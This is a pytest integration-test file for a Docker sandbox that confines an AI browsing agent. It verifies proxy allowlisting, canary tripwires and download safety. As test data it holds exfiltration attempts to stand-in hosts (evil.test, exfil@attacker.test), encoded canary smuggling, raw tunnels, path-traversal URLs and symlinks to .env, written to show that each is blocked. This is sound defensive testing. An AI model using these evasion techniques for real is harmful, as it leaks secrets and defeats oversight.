"""Integration tests for the Docker sandbox backend.

Skipped automatically unless a Docker daemon is reachable AND the stack is already up
(`make sandbox-up`). `make test` never starts Docker. `make sandbox-test` sets
AIRLOCK_REQUIRE_DOCKER=1 so a missing stack fails instead of skipping.

Side effects: the container's /workspace is the bind mount <repo>/state/workspace, so these tests
work in a unique subfolder there and clean it up. The live canaries (state/canaries.json) are only
read, never rewritten. Gateway state (audit log, snapshots) goes to a temp dir.
"""
import asyncio
import json
import os
import re
import shutil
import stat
import subprocess
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from airlock.approvals import MockChannel
from airlock.build import build_gateway
from airlock.config import REPO_DIR, Settings
from airlock.models import Action
from airlock.sandbox import DockerSandbox
from airlock.tripwire import CanarySet

CONTAINER = "airlock-sandbox"
REAL_STATE = REPO_DIR / "state"
REAL_WORKSPACE = REAL_STATE / "workspace"


def _stack_up() -> tuple[bool, str]:
    if shutil.which("docker") is None:
        return False, "docker is not installed"
    try:
        out = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", CONTAINER],
                             capture_output=True, text=True, timeout=15)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return False, f"docker not usable: {exc}"
    if out.returncode != 0 or out.stdout.strip() != "true":
        return False, f"{CONTAINER} is not running (run `make sandbox-up`)"
    sock = subprocess.run(["docker", "exec", CONTAINER, "test", "-S", "/tmp/airlock.sock"], capture_output=True)
    return (sock.returncode == 0, "tool runner socket not ready" if sock.returncode else "")


_UP, _WHY = _stack_up()
if not _UP and os.getenv("AIRLOCK_REQUIRE_DOCKER") == "1":
    pytest.fail(f"AIRLOCK_REQUIRE_DOCKER=1 but Docker stack unavailable: {_WHY}", pytrace=False)
pytestmark = pytest.mark.skipif(not _UP, reason=_WHY)


def run(coro):
    return asyncio.run(coro)


def sandbox_exec(*args: str, stdin: str | None = None) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", "exec", "-i", CONTAINER, *args], input=stdin, capture_output=True,
                          text=True, timeout=60)


@pytest.fixture
def sb(tmp_path):
    return DockerSandbox(REAL_WORKSPACE, tmp_path / "snaps")


@pytest.fixture
def scratch():
    """A unique folder name inside the mounted workspace; removed afterwards."""
    name = f"_dockertest_{uuid.uuid4().hex[:8]}"
    yield name
    shutil.rmtree(REAL_WORKSPACE / name, ignore_errors=True)


def act(sb, type_, **details):
    return run(sb.exec_tool(Action(type=type_, details=details)))


# --- network isolation (Layer 5) --------------------------------------------------------------

def test_container_is_on_internal_network_only():
    nets = json.loads(subprocess.run(["docker", "inspect", "-f", "{{json .NetworkSettings.Networks}}", CONTAINER],
                                     capture_output=True, text=True).stdout)
    assert len(nets) == 1
    (name,) = nets
    internal = subprocess.run(["docker", "network", "inspect", "-f", "{{.Internal}}", name],
                              capture_output=True, text=True).stdout.strip()
    assert internal == "true"


def test_no_direct_internet():
    code = ("import socket,sys\n"
            "try:\n socket.create_connection(('1.1.1.1',80),timeout=5); print('CONNECTED')\n"
            "except OSError as e: print('blocked')\n")
    assert sandbox_exec("python3", "-c", code).stdout.strip() == "blocked"


_PROXY_FETCH = (
    "import urllib.request,urllib.error,sys\n"
    "req=urllib.request.Request(sys.argv[1],data=sys.argv[2].encode() if len(sys.argv)>2 else None)\n"
    "try: print(urllib.request.urlopen(req,timeout=20).status)\n"
    "except urllib.error.HTTPError as e: print(e.code)\n"
    "except Exception as e:\n"
    " r=str(getattr(e,'reason',e)); print('403' if 'Tunnel connection failed: 403' in r else 'ERR '+type(e).__name__+' '+r[:60])\n"
)


def fetch(url: str, body: str | None = None) -> str:
    args = ["python3", "-c", _PROXY_FETCH, url] + ([body] if body else [])
    return sandbox_exec(*args).stdout.strip()


def test_proxy_serves_allowlisted_demo_page_and_blocks_others():
    assert fetch("http://demo.local/clean.html") == "200"
    assert fetch("http://evil.test/collect") == "403"


def test_demo_server_unreachable_directly_only_through_proxy():
    code = "import socket\ntry: socket.create_connection(('demo.local',80),timeout=4); print('CONNECTED')\nexcept OSError: print('blocked')\n"
    env_free = sandbox_exec("env", "-u", "HTTP_PROXY", "-u", "HTTPS_PROXY", "python3", "-c", code)
    assert env_free.stdout.strip() == "blocked"


def test_novnc_viewer_answers_on_localhost():
    import urllib.request
    assert urllib.request.urlopen("http://127.0.0.1:6080/vnc.html", timeout=10).status == 200


# --- tool runner through DockerSandbox --------------------------------------------------------

def test_runner_unix_socket_roundtrip():
    out = sandbox_exec("python3", "/opt/tools/tool_runner.py", "call", stdin='{"type":"bogus","details":{}}')
    assert json.loads(out.stdout) == {"ok": False, "output": "unsupported action type: bogus"}


def test_file_tools_and_path_confinement(sb, scratch):
    assert act(sb, "write_file", path=f"{scratch}/a.txt", content="hello").ok
    assert (REAL_WORKSPACE / scratch / "a.txt").read_text() == "hello"      # visible on the host
    assert act(sb, "read_file", path=f"/workspace/{scratch}/a.txt").output == "hello"
    assert not act(sb, "read_file", path="/etc/passwd").ok
    assert not act(sb, "write_file", path="../escape.txt", content="x").ok
    assert act(sb, "delete_file", path=f"{scratch}/a.txt").ok
    assert not (REAL_WORKSPACE / scratch / "a.txt").exists()


def test_browser_tools_demo_page_via_proxy(sb):
    assert act(sb, "navigate", url="http://demo.local/clean.html").ok
    page = act(sb, "read_page")
    assert "Acme Pricing" in page.output
    shot = act(sb, "screenshot")
    assert shot.ok and shot.screenshot_ref and (REAL_STATE / "shots" / shot.screenshot_ref).exists()


def test_browser_form_tools_change_the_page(sb):
    page = ("data:text/html,<label for=n>Name</label><input id=n oninput=\"o.textContent='typed:'+this.value\">"
            "<button onclick=\"o.textContent+=' clicked'\">Go</button>"
            "<form onsubmit=\"o.textContent+=' submitted';return false\"><button type=submit>Send it</button></form>"
            "<div id=o>start</div>")
    assert act(sb, "navigate", url=page).ok
    assert act(sb, "type_text", field="Name", text="Ada").ok
    assert act(sb, "click", target="Go").ok
    assert act(sb, "submit_form", target="Send it").ok
    assert act(sb, "scroll").ok and act(sb, "wait", seconds=0).ok
    assert "typed:Ada clicked submitted" in act(sb, "read_page").output


def test_blocked_host_page_shows_proxy_block(sb):
    assert act(sb, "navigate", url="http://evil.test/collect").ok
    assert "Blocked by Airlock" in act(sb, "read_page").output


def test_unimplemented_tools_fail_honestly(sb):
    for t in ("run_shell", "send_payment", "enter_credentials"):    # not implemented in the runner: they fail, they are not faked
        r = act(sb, t, url="http://demo.local/clean.html")
        assert not r.ok


# --- tripwire, proxy reporting, snapshots (Layers 4, 5, 6) -----------------------------------

def _live_canaries() -> CanarySet:
    path = REAL_STATE / "canaries.json"
    if not path.exists():
        pytest.skip("no state/canaries.json yet (start the gateway once in docker mode)")
    return CanarySet.load(path)


def _gateway(tmp_path, decision: str | None = None):
    """Gateway with throwaway audit/snapshots/outbox, the real mounted workspace, and the live canaries."""
    gw = build_gateway(Settings(state_dir=tmp_path / "state", mode="docker", approval_timeout=1.0),
                       extra_channels=[MockChannel(decision)] if decision else None)
    canaries = _live_canaries()
    gw.canaries = gw.policy.canaries = canaries
    outbox = gw.sandbox.outbox
    gw.sandbox = DockerSandbox(REAL_WORKSPACE, tmp_path / "snaps")
    gw.sandbox.outbox = outbox
    return gw


def test_canaries_planted_inside_container_workspace():
    live = _live_canaries()
    for rel, content in live.files.items():
        assert sandbox_exec("cat", f"/workspace/{rel}").stdout == content
    assert sandbox_exec("test", "-e", "/state").returncode != 0      # canary list itself is not mounted


def test_canary_read_is_hard_stop_and_freezes(tmp_path):
    gw = _gateway(tmp_path)
    r = run(gw.submit(Action(type="read_file", details={"path": "/workspace/.env"})))
    assert r.status == "blocked" and gw.frozen
    events = [e["kind"] for e in gw.audit.list()]
    assert "tripwire" in events and "action_executed" not in events      # sandbox never called
    assert run(gw.submit(Action(type="read_page"))).status == "frozen"


def test_canary_value_in_action_is_hard_stop(tmp_path):
    gw = _gateway(tmp_path)
    r = run(gw.submit(Action(type="navigate", details={"url": f"http://example.com/?k={gw.canaries.values[0]}"})))
    assert r.status == "blocked" and gw.frozen


def test_proxy_blocks_canary_even_on_allowlisted_host():
    assert fetch("http://example.com/submit", _live_canaries().values[0]) == "403"


class _Collector(BaseHTTPRequestHandler):
    events: list = []

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        _Collector.events.append(json.loads(body))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"{}")

    def log_message(self, *a):
        pass


def test_proxy_reports_events_to_gateway_endpoint():
    _Collector.events = []
    try:
        srv = HTTPServer(("127.0.0.1", 8000), _Collector)
    except OSError:
        pytest.skip("port 8000 busy (gateway running?); stop it to run this test")
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        assert fetch("http://evil.test/collect") == "403"
        assert fetch("http://example.com/submit", _live_canaries().values[0]) == "403"
        for _ in range(50):
            if len(_Collector.events) >= 2:
                break
            time.sleep(0.1)
    finally:
        srv.shutdown()
    kinds = {e["kind"] for e in _Collector.events}
    assert {"egress_blocked", "canary_leak"} <= kinds


def test_snapshot_and_rewind_restore_container_workspace(sb, scratch):
    sid = sb.snapshot("test")
    assert act(sb, "write_file", path=f"{scratch}/new.txt", content="x").ok
    assert sandbox_exec("test", "-e", f"/workspace/{scratch}/new.txt").returncode == 0
    sb.restore(sid)
    assert sandbox_exec("test", "-e", f"/workspace/{scratch}/new.txt").returncode != 0
    assert act(sb, "read_file", path=".env").ok                           # canaries survive the rewind


# --- send_message: simulated, written on the host, never by the container -------------------------------------

MSG = {"to": "boss@example.com", "subject": "Pricing", "body": "Pricing: Starter $9, Team $29."}


def test_runner_refuses_send_message_itself():
    out = sandbox_exec("python3", "/opt/tools/tool_runner.py", "call", stdin=json.dumps({"type": "send_message", "details": MSG}))
    assert json.loads(out.stdout)["ok"] is False and "gateway outbox" in json.loads(out.stdout)["output"]


def test_approved_message_lands_in_host_outbox_and_container_cannot_see_it(tmp_path):
    gw = _gateway(tmp_path, "approve")
    r = run(gw.submit(Action(type="send_message", details=MSG)))
    assert r.status == "executed" and "SIMULATED" in r.output
    (entry,) = gw.sandbox.outbox.list()
    assert entry["to"] == "boss@example.com" and entry["simulated"] is True
    found = sandbox_exec("sh", "-c", "find / -name 'outbox*' -not -path '/proc/*' 2>/dev/null; echo done").stdout
    assert found.strip() == "done"                                   # nothing outbox-like exists inside the container


def test_denied_message_writes_nothing_in_docker_mode(tmp_path):
    gw = _gateway(tmp_path, "deny")
    r = run(gw.submit(Action(type="send_message", details=MSG)))
    assert r.status == "denied" and gw.sandbox.outbox.list() == []


def test_seeded_exfil_files_are_in_the_container_and_canary_variant_freezes(tmp_path):
    live = _live_canaries()
    seeded = REAL_WORKSPACE / "notes" / "old-env-backup.txt"
    if not seeded.exists():
        pytest.skip("demo files not seeded yet (start the gateway or run `make demo-reset` once)")
    assert live.values[0] in sandbox_exec("cat", "/workspace/notes/old-env-backup.txt").stdout   # visible in the container
    gw = _gateway(tmp_path, "approve")
    body = act(DockerSandbox(REAL_WORKSPACE, tmp_path / "s2"), "read_file", path="notes/old-env-backup.txt").output
    assert not gw.canaries.is_canary_path("/workspace/notes/old-env-backup.txt")                 # reading it is allowed...
    r = run(gw.submit(Action(type="send_message", details={**MSG, "to": "exfil@attacker.test", "body": body})))
    assert r.status == "blocked" and gw.frozen and gw.sandbox.outbox.list() == []                # ...sending it is a HARD_STOP


# --- red team: the runner must act on exactly the text the policy judged ---------------------------------------

_BUTTONS = ("data:text/html,<label for=p>Password</label><input id=p oninput=\"o.textContent='typed:'+this.value\">"
            "<button onclick=\"o.textContent+=' CLICKED'\">Submit</button><div id=o>start</div>")


def test_click_and_type_need_the_exact_text_the_policy_judged(sb):
    assert act(sb, "navigate", url=_BUTTONS).ok
    for partial in ("ubmi", "ubmit", "Sub", "SUBMIT", "submit"):          # substrings would click the Submit button unseen
        r = act(sb, "click", target=partial)
        assert not r.ok, partial
    assert "CLICKED" not in act(sb, "read_page").output
    assert not act(sb, "type_text", field="Pass", text="x").ok            # a partial label would reach the password field
    assert act(sb, "type_text", field="Password", text="x").ok and act(sb, "click", target="Submit").ok
    assert "typed:x CLICKED" in act(sb, "read_page").output


def test_submit_form_target_is_not_a_regex(sb):
    assert act(sb, "navigate", url=_BUTTONS).ok
    assert not act(sb, "submit_form", target=".*").ok and not act(sb, "submit_form", target="Sub.*").ok
    assert "CLICKED" not in act(sb, "read_page").output


def test_runner_screenshot_refs_are_plain_file_names(sb):
    shot = act(sb, "screenshot")
    assert shot.ok and shot.screenshot_ref and "/" not in shot.screenshot_ref and shot.screenshot_ref.endswith(".png")


def test_real_proxy_blocks_an_encoded_canary_but_not_ordinary_traffic():
    import base64
    v = _live_canaries().values[0]
    for carried in (base64.b64encode(f"k={v}".encode()).decode(), v.encode().hex(), "-".join(v), v[::-1]):
        assert fetch("http://example.com/submit", f"data={carried}") == "403", carried[:20]
    assert fetch("http://example.com/submit", "Pricing: Starter $9") in ("200", "404", "405")   # example.com's own answer: not blocked


def test_links_made_inside_the_container_to_a_canary_are_still_a_canary(tmp_path):
    """A compromised browser could `ln` inside the bind-mounted workspace; the gateway must see through it on the host."""
    live = _live_canaries()
    if not (REAL_WORKSPACE / ".env").exists():
        pytest.skip("workspace not seeded yet")
    gw = _gateway(tmp_path, "approve")
    gw.policy.workspace = REAL_WORKSPACE
    name = f"_lnk_{uuid.uuid4().hex[:6]}"
    try:
        assert sandbox_exec("sh", "-c", f"ln /workspace/.env /workspace/{name}_hard && ln -s .env /workspace/{name}_soft "
                                        f"&& ln -s /workspace/.env /workspace/{name}_abs").returncode == 0
        for suffix in ("_hard", "_soft", "_abs"):
            r = run(gw.submit(Action(type="read_file", details={"path": name + suffix})))
            assert r.status == "blocked" and live.values[0] not in (r.output or ""), suffix
            gw.unfreeze()
    finally:
        for suffix in ("_hard", "_soft", "_abs"):
            (REAL_WORKSPACE / (name + suffix)).unlink(missing_ok=True)


# --- HTTPS from non-browser tools inside the sandbox (the proxy's CA is trusted; its key is not here) ----------------

def sandbox_sh(cmd: str) -> str:
    return sandbox_exec("sh", "-c", cmd).stdout.strip()


def curl_code(url: str, *extra: str) -> str:
    """The HTTP status; if the proxy refused the CONNECT (no response from the site), the CONNECT status."""
    return sandbox_sh("o=$(curl -s -o /dev/null -m 20 -w '%{http_code} %{http_connect}' " + " ".join(extra) + f" '{url}'); set -- $o; "
                      "if [ \"$1\" = 000 ]; then echo $2; else echo $1; fi")


def test_proxy_ca_certificate_is_installed_and_the_environment_points_at_it():
    env = dict(line.split("=", 1) for line in sandbox_exec("env").stdout.splitlines() if "=" in line)
    for var in ("SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "GIT_SSL_CAINFO", "PIP_CERT"):
        assert env.get(var) == "/etc/ssl/certs/ca-certificates.crt", var
    assert env.get("NODE_EXTRA_CA_CERTS") == "/airlock-ca/airlock-proxy-ca.crt"
    ours = (REAL_STATE / "mitm-ca" / "public" / "airlock-proxy-ca.crt").read_text().strip()
    assert ours in sandbox_exec("cat", "/etc/ssl/certs/ca-certificates.crt").stdout     # the system bundle now includes the proxy CA


def test_proxy_ca_private_key_is_not_in_the_sandbox():
    private = REAL_STATE / "mitm-ca" / "private" / "mitmproxy-ca.pem"
    assert private.exists(), "run `make sandbox-up` once so the CA exists"
    body_line = next(l for l in private.read_text().splitlines() if len(l) == 64 and "-----" not in l)   # a line of the key's base64
    # 1. what the container mounts: the public folder only, read-only; never the private folder or the state root
    mounts = json.loads(subprocess.run(["docker", "inspect", "-f", "{{json .Mounts}}", CONTAINER], capture_output=True, text=True).stdout)
    sources = {m["Source"]: m for m in mounts}
    assert not any("mitm-ca/private" in s for s in sources) and not any(s.rstrip("/").endswith("/state") for s in sources), sources
    ca = [m for s, m in sources.items() if "mitm-ca" in s]
    assert len(ca) == 1 and ca[0]["Source"].endswith("mitm-ca/public") and ca[0]["RW"] is False
    # 2. what is on its disk: no file anywhere holds a line of the key, and no private-key block sits in the trust folders
    found = sandbox_sh(f"grep -rIlF -- '{body_line}' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null; echo done")
    assert found == "done", found
    assert sandbox_sh("grep -rl 'PRIVATE KEY' /airlock-ca /usr/local/share/ca-certificates /etc/ssl/certs 2>/dev/null; echo done") == "done"
    assert sandbox_sh("ls /airlock-ca") == "airlock-proxy-ca.crt"
    assert sandbox_exec("sh", "-c", "touch /airlock-ca/x").returncode != 0                      # read-only
    # 3. the same on the host side of the public folder
    assert "PRIVATE KEY" not in (REAL_STATE / "mitm-ca" / "public" / "airlock-proxy-ca.crt").read_text()


def test_https_to_an_allowlisted_host_works_from_python_and_curl():
    assert fetch("https://example.com/") == "200"
    assert curl_code("https://example.com/") == "200"
    assert sandbox_sh("python3 -c \"import ssl;print(len(ssl.create_default_context().get_ca_certs()) > 0)\"") == "True"


def test_https_to_a_host_that_is_not_allowlisted_is_blocked_by_the_proxy():
    assert fetch("https://evil.test/collect") == "403"
    assert curl_code("https://evil.test/collect") == "403"
    assert fetch("https://www.iana.org/") == "403"          # a real site that is simply not on the list


def test_canary_in_an_https_url_or_body_is_blocked_even_on_an_allowlisted_host():
    v = _live_canaries().values[0]
    assert fetch(f"https://example.com/x?k={v}") == "403"
    assert fetch("https://example.com/submit", f"data={v}") == "403"
    assert curl_code("https://example.com/submit", "--data", f"'k={v}'") == "403"
    assert curl_code(f"https://example.com/{v}") == "403"
    import base64
    assert fetch("https://example.com/submit", "d=" + base64.b64encode(v.encode()).decode()) == "403"


def test_https_blocks_are_reported_to_the_gateway_endpoint():
    v = _live_canaries().values[0]
    _Collector.events = []
    try:
        srv = HTTPServer(("127.0.0.1", 8000), _Collector)
    except OSError:
        pytest.skip("port 8000 busy (gateway running?); stop it to run this test")
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        assert fetch("https://evil.test/collect") == "403"
        assert fetch("https://example.com/submit", f"data={v}") == "403"
        for _ in range(60):
            if len(_Collector.events) >= 2:
                break
            time.sleep(0.1)
    finally:
        srv.shutdown()
    assert {"egress_blocked", "canary_leak"} <= {e["kind"] for e in _Collector.events}
    assert v not in json.dumps(_Collector.events)             # the report names the host, never the value


def test_direct_internet_is_still_unreachable_over_https_too():
    out = sandbox_sh("curl --noproxy '*' -s -o /dev/null -m 6 -w '%{http_code}' https://example.com/ ; echo \" rc=$?\"")
    assert out.startswith("000")
    code = ("import socket\ntry: socket.create_connection(('1.1.1.1',443),timeout=5); print('CONNECTED')\nexcept OSError: print('blocked')\n")
    assert sandbox_exec("env", "-u", "HTTPS_PROXY", "-u", "HTTP_PROXY", "python3", "-c", code).stdout.strip() == "blocked"


def _proxy_log_since(mark: str) -> str:
    out = subprocess.run(["docker", "logs", "--since", mark, "airlock-proxy"], capture_output=True, text=True)
    return out.stdout + out.stderr


def test_a_refused_https_host_is_never_resolved_or_connected_to_by_the_proxy():
    """The allowlist is applied at CONNECT, before mitmproxy touches the network: no DNS lookup, no connection, so a hostname
    cannot carry data out and a refused server never sees a handshake."""
    time.sleep(1.1)                       # let the previous test's log lines age out of the window
    mark = str(int(time.time()))          # a Unix timestamp: no time-zone ambiguity
    for url in ("https://www.iana.org/", "https://evil.test/x", "https://6162636465666768696a6b.attacker.example.net/"):
        assert fetch(url) == "403", url
        assert curl_code(url) == "403", url
    log = _proxy_log_since(mark)
    assert "CONNECT" in log                                   # the requests did reach the proxy...
    assert "server connect www.iana.org" not in log and "server connect evil.test" not in log
    assert "Name or service not known" not in log and "attacker.example.net:443 (" not in log   # ...and it never looked the hosts up


_RAW_TUNNEL = '''
import os, socket, sys, time
s = socket.create_connection(("proxy", 8080), timeout=10)
s.sendall(b"CONNECT example.com:443 HTTP/1.1\\r\\nHost: example.com:443\\r\\n\\r\\n")
status = s.recv(200).split(b"\\r\\n")[0].decode()
s.sendall(b"\\x00\\x01custom-protocol " + os.environ["CAN"].encode() + b"\\r\\n\\r\\n")   # neither TLS nor HTTP
time.sleep(2); s.settimeout(4)
try: reply = s.recv(300)
except Exception: reply = b""
print(status, "|", reply[:160].decode("latin-1"))
'''


def test_raw_non_http_bytes_through_an_allowed_tunnel_are_refused_not_relayed():
    """mitmproxy relays a protocol it does not recognise as raw TCP, which no scan can read; that used to reach example.com
    (Cloudflare answered '400 Bad Request' to a canary-bearing payload). The proxy now runs with rawtcp=false: it answers itself."""
    v = _live_canaries().values[0]
    time.sleep(1.1)
    mark = str(int(time.time()))
    out = subprocess.run(["docker", "exec", "-i", "-e", f"CAN={v}", CONTAINER, "python3", "-c", _RAW_TUNNEL], capture_output=True, text=True, timeout=40).stdout.strip()
    assert "mitmproxy" in out.lower() and "cloudflare" not in out.lower(), out          # the proxy answered; the real server never did
    log = _proxy_log_since(mark)
    assert "-> tcp ->" not in log and "<- tcp <-" not in log, log                       # and no raw-TCP relay was opened


def test_connect_to_other_ports_is_refused_even_for_an_allowlisted_host():
    for port in (22, 25, 8443, 6379):
        o = sandbox_sh(f"python3 - <<'EOF'\nimport socket\ns=socket.create_connection(('proxy',8080),timeout=10)\n"
                       f"s.sendall(b'CONNECT example.com:{port} HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n')\nprint(s.recv(100).split(b'\\r\\n')[0].decode())\nEOF")
        assert "403" in o, (port, o)


# --- the download tool, live: real container, real proxy, real HTTPS ----------------------------------------------------

@pytest.fixture
def clean_downloads():
    shutil.rmtree(REAL_WORKSPACE / "downloads", ignore_errors=True)
    yield REAL_WORKSPACE / "downloads"
    shutil.rmtree(REAL_WORKSPACE / "downloads", ignore_errors=True)


def _top_level():
    return sorted(p.name for p in REAL_WORKSPACE.iterdir() if p.name != "downloads")


def dl_submit(gw, url, **extra):
    return run(gw.submit(Action(type="download", details={"url": url, **extra})))


def test_approved_download_over_http_is_saved_safely_inside_the_container(tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    r = dl_submit(gw, "http://demo.local/clean.html")
    assert r.status == "executed" and r.ok and "downloads/clean.html" in r.output, r
    saved = clean_downloads / "clean.html"
    assert saved.read_bytes() == (REPO_DIR / "demo" / "pages" / "clean.html").read_bytes()
    assert stat.S_IMODE(saved.stat().st_mode) & 0o111 == 0                                   # never executable
    assert sandbox_exec("cat", "/workspace/downloads/clean.html").stdout.startswith("<!doctype html>")
    assert sorted(p.name for p in clean_downloads.iterdir()) == ["clean.html"]


def test_approved_download_over_https_works_through_the_trusted_proxy_ca(tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    r = dl_submit(gw, "https://example.com/")
    assert r.status == "executed" and r.ok, r
    assert b"Example Domain" in (clean_downloads / "download").read_bytes()


def test_a_denied_download_writes_nothing_and_never_reaches_the_proxy(tmp_path, clean_downloads):
    time.sleep(1.1)
    mark = str(int(time.time()))
    gw = _gateway(tmp_path, "deny")
    r = dl_submit(gw, "http://demo.local/clean.html")
    assert r.status == "denied" and not clean_downloads.exists()
    assert "clean.html" not in _proxy_log_since(mark)


def test_download_from_a_host_off_the_allowlist_is_refused_by_the_proxy_and_leaves_no_file(tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    for url in ("http://evil.test/payload.html", "https://www.iana.org/x.html", "https://evil.test/p.bin"):
        r = dl_submit(gw, url)
        assert r.status == "executed" and not r.ok and "403" in r.output, (url, r)         # approved by the human, refused by the wall
    assert not clean_downloads.exists() or list(clean_downloads.iterdir()) == []


def test_a_canary_in_the_download_url_is_stopped_at_the_gateway(tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    v = _live_canaries().values[0]
    import base64
    for url in (f"http://demo.local/clean.html?k={v}", "http://demo.local/?d=" + base64.b64encode(v.encode()).decode(), f"https://example.com/{v.encode().hex()}"):
        gw.unfreeze()
        assert dl_submit(gw, url).status == "blocked", url
    assert not clean_downloads.exists()


def test_an_oversize_download_is_cut_off_and_leaves_no_file(tmp_path, clean_downloads):
    big = REPO_DIR / "demo" / "pages" / "_airlock_big_download_test.html"
    big.write_bytes(b"x" * (6 * 1024 * 1024))                       # served live by the demo container; removed below
    try:
        gw = _gateway(tmp_path, "approve")
        r = dl_submit(gw, "http://demo.local/_airlock_big_download_test.html")
        assert r.status == "executed" and not r.ok and "too large" in r.output, r
        assert not clean_downloads.exists() or list(clean_downloads.iterdir()) == []
    finally:
        big.unlink(missing_ok=True)


def test_hostile_looking_urls_cannot_write_outside_downloads(tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    before = _top_level()
    for url in ("http://demo.local/a/..%2f..%2fclean.html", "http://demo.local/%2e%2e/%2e%2e/clean.html", "http://demo.local/.env", "http://demo.local/clean.html#/../../x"):
        dl_submit(gw, url, filename="../../escape.txt", headers={"X": "y"})
    assert _top_level() == before and not (REAL_WORKSPACE.parent / "escape.txt").exists()
    names = [p.name for p in clean_downloads.iterdir()] if clean_downloads.exists() else []
    assert all(re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", n) for n in names), names
    assert (REAL_WORKSPACE / ".env").read_text() == _live_canaries().files[".env"]          # the canary was not replaced by a download called .env


def test_a_download_is_never_overwritten_and_rewind_removes_it(sb, tmp_path, clean_downloads):
    gw = _gateway(tmp_path, "approve")
    gw.sandbox = sb                                                                            # the fixture's DockerSandbox: real snapshot store
    sid = sb.snapshot("before download")
    assert dl_submit(gw, "http://demo.local/clean.html").ok
    (clean_downloads / "clean.html").write_text("MINE")
    assert dl_submit(gw, "http://demo.local/clean.html").ok
    assert sorted(p.name for p in clean_downloads.iterdir()) == ["clean-1.html", "clean.html"] and (clean_downloads / "clean.html").read_text() == "MINE"
    sb.restore(sid)
    assert not clean_downloads.exists()
    assert (REAL_WORKSPACE / ".env").read_text() == _live_canaries().files[".env"]
